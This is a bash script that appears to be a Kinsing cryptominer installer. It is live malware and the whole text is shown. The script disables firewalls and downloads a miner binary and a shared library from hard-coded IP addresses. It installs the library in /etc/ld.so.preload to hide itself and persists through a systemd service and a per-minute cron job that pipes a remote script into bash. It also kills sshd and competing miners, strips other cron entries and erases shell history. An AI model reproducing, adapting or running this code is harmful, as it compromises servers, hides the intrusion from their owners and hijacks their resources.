#!/bin/bash

ulimit -n 65535

chattr -i /etc/ld.so.preload
rm -f /etc/ld.so.preload
chattr -R -i /var/spool/cron
chattr -i /etc/crontab
ufw disable
iptables -F
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
ROOTUID="0"

function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

if [ -s /usr/bin/curl ]; then
  echo "found curl"
elif [ -s /usr/bin/wget ]; then
  echo "found wget"
else
  echo "found none"
  if [ "$(id -u)" -ne "$ROOTUID" ] ; then
    echo "not root"
  else
    apt-get update
    apt-get install -y curl
    apt-get install -y wget
    apt-get install -y cron
  fi
fi


SERVICE_NAME="bot"
BIN_NAME="kinsing"
SO_NAME="libsystem.so"
BIN_PATH="/etc"
if [ "$(id -u)" -ne "$ROOTUID" ] ; then
  BIN_PATH="/tmp"
  if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
    echo "$BIN_PATH not exists or not writeable"
    mkdir /tmp
  fi
  if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
    echo "$BIN_PATH replacing with /var/tmp"
    BIN_PATH="/var/tmp"
  fi
  if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
    TMP_DIR=$(mktemp -d)
    echo "$BIN_PATH replacing with $TMP_DIR"
    BIN_PATH="$TMP_DIR"
  fi
  if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
    echo "$BIN_PATH replacing with /dev/shm"
    BIN_PATH="/dev/shm"
  fi
  if [ -e "$BIN_PATH/$BIN_NAME" ]; then
    echo "$BIN_PATH/$BIN_NAME exists"
    if [ ! -w "$BIN_PATH/$BIN_NAME" ]; then
      echo "$BIN_PATH/$BIN_NAME not writeable"
      TMP_BIN_NAME=$(head -3 /dev/urandom | tr -cd '[:alnum:]' | cut -c -8)
      BIN_NAME="kinsing_$TMP_BIN_NAME"
    else
      echo "writeable $BIN_PATH/$BIN_NAME"
    fi
  fi
fi
if [ ! -e "$BIN_PATH" ] || [ ! -w "$BIN_PATH" ]; then
  echo "$BIN_PATH still not writeable"
  BIN_PATH="/dev/shm"
fi
BIN_FULL_PATH="$BIN_PATH/$BIN_NAME"
echo "$BIN_FULL_PATH"

BIN_MD5="2c44b4e4706b8bd95d1866d7867efa0e"
BIN_DOWNLOAD_URL="http://194.38.20.11/kinsing"
BIN_DOWNLOAD_URL2="http://194.38.20.11/kinsing"
CURL_DOWNLOAD_URL="http://194.38.20.11/curl-amd64"

SO_FULL_PATH="$BIN_PATH/$SO_NAME"
SO_DOWNLOAD_URL="http://194.38.20.11/libsystem.so"
SO_DOWNLOAD_URL2="http://194.38.20.11/libsystem.so"
SO_MD5="ccef46c7edf9131ccffc47bd69eb743b"


LDR="wget -q -O -"
if [ -s /usr/bin/curl ]; then
  LDR="curl"
fi
if [ -s /usr/bin/wget ]; then
  LDR="wget -q -O -"
fi

if [ -x "$(command -v curl)" ]; then
  WGET="curl -o"
elif [ -x "$(command -v wget)" ]; then
  WGET="wget -O"
else
  curl -V || __curl "$CURL_DOWNLOAD_URL" > /usr/local/bin/curl; chmod +x /usr/local/bin/curl
  /usr/local/bin/curl -V && WGET="/usr/local/bin/curl -o"
  /usr/local/bin/curl -V || __curl "$CURL_DOWNLOAD_URL" > $HOME/curl; chmod +x $HOME/curl
  $HOME/curl -V && WGET="$HOME/curl -o"
  $HOME/curl -V || __curl "$CURL_DOWNLOAD_URL" > $BIN_PATH/curl; chmod +x $BIN_PATH/curl
  $BIN_PATH/curl -V && WGET="$BIN_PATH/curl -o"
fi
echo "wget is $WGET"

ls -la $BIN_PATH | grep -e "/dev" | grep -v grep
if [ $? -eq 0 ]; then
  rm -rf $BIN_FULL_PATH
  rm -rf $SO_FULL_PATH
  rm -rf $BIN_PATH/kdevtmpfsi
  rm -rf $BIN_PATH/libsystem.so
  rm -rf /tmp/kdevtmpfsi
  echo "found /dev"
else
  echo "not found /dev"
fi

download() {
  DOWNLOAD_PATH=$1
  DOWNLOAD_URL=$2
  if [ -L $DOWNLOAD_PATH ]
  then
    rm -rf $DOWNLOAD_PATH
  fi
  if [[ -d $DOWNLOAD_PATH ]]
  then
    rm -rf $DOWNLOAD_PATH
  fi
  chmod 777 $DOWNLOAD_PATH
  $WGET $DOWNLOAD_PATH $DOWNLOAD_URL
  chmod +x $DOWNLOAD_PATH
}

checkExists() {
  CHECK_PATH=$1
  MD5=$2
  sum=$(md5sum $CHECK_PATH | awk '{ print $1 }')
  retval=""
  if [ "$MD5" = "$sum" ]; then
    echo >&2 "$CHECK_PATH is $MD5"
    retval="true"
  else
    echo >&2 "$CHECK_PATH is not $MD5, actual $sum"
    retval="false"
  fi
  echo "$retval"
}

getSystemd() {
  AUTOSTART_PATH=$1
  echo "[Unit]"
  echo "Description=Start daemon at boot time"
  echo "After="
  echo "Requires="
  echo "[Service]"
  echo "Type=forking"
  echo "RestartSec=10s"
  echo "Restart=always"
  echo "TimeoutStartSec=5"
  echo "ExecStart=$AUTOSTART_PATH"
  echo "[Install]"
  echo "WantedBy=multi-user.target"
}

killF(){
  pkill -f sshd
  pkill -f htop
  pkill -f linuxsys
  pkill -f kthreaddo
  pkill -f donkey
  netstat -anp | grep ":1414" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  ps aux| grep "tracepath"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux| grep "/dot"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  pkill -f hezb
  pkill -f /tmp/.out
  ps aux| grep "./ll1"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep "agetty" | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
  pkill -f 42.112.28.216
  netstat -anp | grep "207.38.87.6" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep "127.0.0.1:52018" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep "34.81.218.76:9486" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  netstat -anp | grep "42.112.28.216:9486" | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
  pkill -f .git/kthreaddw
  pkill -f 80.211.206.105
  pkill -f 207.38.87.6
  pkill -f p8444
  pkill -f supportxmr
  pkill -f monero
  pkill -f kthreaddi
  pkill -f srv00
  pkill -f /tmp/.javae/javae
  pkill -f .javae
  pkill -f .syna
  pkill -f .main
  pkill -f xmm
  pkill -f solr.sh
  pkill -f /tmp/.solr/solrd
  pkill -f /tmp/javac
  pkill -f /tmp/.go.sh
  pkill -f /tmp/.x/agetty
  pkill -f /tmp/.x/kworker
  pkill -f c3pool
  pkill -f /tmp/.X11-unix/gitag-ssh
  pkill -f /tmp/1
  pkill -f /tmp/okk.sh
  pkill -f /tmp/gitaly
  pkill -f /tmp/.x/kworker
  pkill -f 43a6eY5zPm3UFCaygfsukfP94ZTHz6a1kZh5sm1aZFB
  pkill -f /tmp/.X11-unix/supervise
  pkill -f /tmp/.ssh/redis.sh
  ps aux| grep "./udp"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  cat /tmp/.X11-unix/01|xargs -I % kill -9 %
  cat /tmp/.X11-unix/11|xargs -I % kill -9 %
  cat /tmp/.X11-unix/22|xargs -I % kill -9 %
  cat /tmp/.systemd.1|xargs -I % kill -9 %
  cat /tmp/.systemd.2|xargs -I % kill -9 %
  cat /tmp/.systemd.3|xargs -I % kill -9 %
  kill -9 $(cat /tmp/.systemd.1)
  kill -9 $(cat /tmp/.systemd.2)
  kill -9 $(cat /tmp/.systemd.3)
  cat /tmp/.pg_stat.0|xargs -I % kill -9 %
  cat /tmp/.pg_stat.1|xargs -I % kill -9 %
  cat $HOME/data/./oka.pid|xargs -I % kill -9 %
  pkill -f zsvc
  pkill -f pdefenderd
  pkill -f updatecheckerd
  pkill -f cruner
  pkill -f dbused
  pkill -f bashirc
  pkill -f meminitsrv
  ps aux| grep "./oka"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps aux| grep "postgres: autovacum"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
  ps ax -o command,pid -www| awk 'length($1) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey|grep -v kinsing| awk '{print $2}'|xargs -I % kill -9 %
  ps ax -o command,pid -www| awk 'length($1) == 16'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $2}'|xargs -I % kill -9 %
  ps ax| awk 'length($5) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $1}'|xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/sscks' | awk '{print $2}' | xargs -I % kill -9 %
}

killF
autoinit() {
  getSystemd $BIN_FULL_PATH >/lib/systemd/system/$SERVICE_NAME.service
  systemctl enable $SERVICE_NAME
  systemctl start $SERVICE_NAME
}

so() {
  soExists=$(checkExists "$SO_FULL_PATH" "$SO_MD5")
  if [ "$soExists" == "true" ]; then
    echo "$SO_FULL_PATH exists and checked"
  else
    echo "$SO_FULL_PATH not exists"
    download $SO_FULL_PATH $SO_DOWNLOAD_URL
    binExists=$(checkExists "$SO_FULL_PATH" "$SO_MD5")
    if [ "$soExists" == "true" ]; then
      echo "$SO_FULL_PATH after download exists and checked"
    else
      echo "$SO_FULL_PATH after download not exists"
      download $SO_FULL_PATH $SO_DOWNLOAD_URL2
      binExists=$(checkExists "$SO_FULL_PATH" "$SO_MD5")
      if [ "$soExists" == "true" ]; then
        echo "$SO_FULL_PATH after download2 exists and checked"
      else
        echo "$SO_FULL_PATH after download2 not exists"
      fi
    fi
  fi
  echo $SO_FULL_PATH >/etc/ld.so.preload
}

cleanCron() {
  crontab -l | sed '/base64/d' | crontab -
  crontab -l | sed '/_cron/d' | crontab -
  crontab -l | sed '/31.210.20.181/d' | crontab -
  crontab -l | sed '/update.sh/d' | crontab -
  crontab -l | sed '/logo4/d' | crontab -
  crontab -l | sed '/logo9/d' | crontab -
  crontab -l | sed '/logo0/d' | crontab -
  crontab -l | sed '/logo/d' | crontab -
  crontab -l | sed '/tor2web/d' | crontab -
  crontab -l | sed '/jpg/d' | crontab -
  crontab -l | sed '/png/d' | crontab -
  crontab -l | sed '/tmp/d' | crontab -
  crontab -l | sed '/zmreplchkr/d' | crontab -
  crontab -l | sed '/aliyun.one/d' | crontab -
  crontab -l | sed '/3.215.110.66.one/d' | crontab -
  crontab -l | sed '/pastebin/d' | crontab -
  crontab -l | sed '/onion/d' | crontab -
  crontab -l | sed '/lsd.systemten.org/d' | crontab -
  crontab -l | sed '/shuf/d' | crontab -
  crontab -l | sed '/ash/d' | crontab -
  crontab -l | sed '/mr.sh/d' | crontab -
  crontab -l | sed '/185.181.10.234/d' | crontab -
  crontab -l | sed '/localhost.xyz/d' | crontab -
  crontab -l | sed '/45.137.151.106/d' | crontab -
  crontab -l | sed '/111.90.159.106/d' | crontab -
  crontab -l | sed '/github/d' | crontab -
  crontab -l | sed '/bigd1ck.com/d' | crontab -
  crontab -l | sed '/xmr.ipzse.com/d' | crontab -
  crontab -l | sed '/185.181.10.234/d' | crontab -
  crontab -l | sed '/91.241.19.134/d' | crontab -
  crontab -l | sed '/122.51.164.83/d' | crontab -
  crontab -l | sed '/185.191.32.198/d' | crontab -
  crontab -l | sed '/newdat.sh/d' | crontab -
  crontab -l | sed '/lib.pygensim.com/d' | crontab -
  crontab -l | sed '/t.amynx.com/d' | crontab -
  crontab -l | sed '/update.sh/d' | crontab -
  crontab -l | sed '/systemd-service.sh/d' | crontab -
  crontab -l | sed '/pg_stat.sh/d' | crontab -
  crontab -l | sed '/sleep/d' | crontab -
  crontab -l | sed '/oka/d' | crontab -
  crontab -l | sed '/linux1213/d' | crontab -
  crontab -l | sed '/#wget/d' | crontab -
  crontab -l | sed '/#curl/d' | crontab -
  crontab -l | sed '/zsvc/d' | crontab -
  crontab -l | sed '/givemexyz/d' | crontab -
  crontab -l | sed '/world/d' | crontab -
  crontab -l | sed '/1.sh/d' | crontab -
  crontab -l | sed '/3.sh/d' | crontab -
  crontab -l | sed '/workers/d' | crontab -
  crontab -l | sed '/oracleservice/d' | crontab -
  crontab -l | sed '/192.81.212.13/d' | crontab -
  crontab -l | sed '/base64/d' | crontab -
  crontab -l | sed '/python/d' | crontab -
  crontab -l | sed '/shm/d' | crontab -
  crontab -l | sed '/postgresql/d' | crontab -
  crontab -l | sed '/cloudfronts/d' | crontab -
  crontab -l | sed '/sshd/d' | crontab -
  crontab -l | sed '/linux/d' | crontab -
  crontab -l | sed '/neoogilvy/d' | crontab -
  crontab -l | sed '/rsync/d' | crontab -
  crontab -l | sed '/bpdeliver/d' | crontab -
}

binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
if [ "$binExists" == "true" ]; then
  echo "$BIN_FULL_PATH exists and checked"
else
  echo "$BIN_FULL_PATH not exists"
  download $BIN_FULL_PATH $BIN_DOWNLOAD_URL
  binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
  if [ "$binExists" == "true" ]; then
    echo "$BIN_FULL_PATH after download exists and checked"
  else
    echo "$BIN_FULL_PATH after download not exists"
    download $BIN_FULL_PATH $BIN_DOWNLOAD_URL2
    binExists=$(checkExists "$BIN_FULL_PATH" "$BIN_MD5")
    if [ "$binExists" == "true" ]; then
      echo "$BIN_FULL_PATH after download2 exists and checked"
    else
      echo "$BIN_FULL_PATH after download2 not exists"
    fi
  fi
fi

so
if [ -L /tmp/kdevtmpfsi ]
then
  rm -rf /tmp/kdevtmpfsi
fi
rm -rf /tmp/kdevtmpfsi
chmod 777 $BIN_FULL_PATH
chmod +x $BIN_FULL_PATH
SKL=ae $BIN_FULL_PATH

if [[ $(id -u) -ne 0 ]]; then
  echo "Running as not root"
else
  echo "Running as root"
  autoinit
fi

cleanCron

crontab -l | grep -e "185.122.204.197" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "* * * * * $LDR http://185.122.204.197/ae.sh | bash > /dev/null 2>&1"
  ) | crontab -
fi

history -c
rm -rf ~/.bash_history
history -c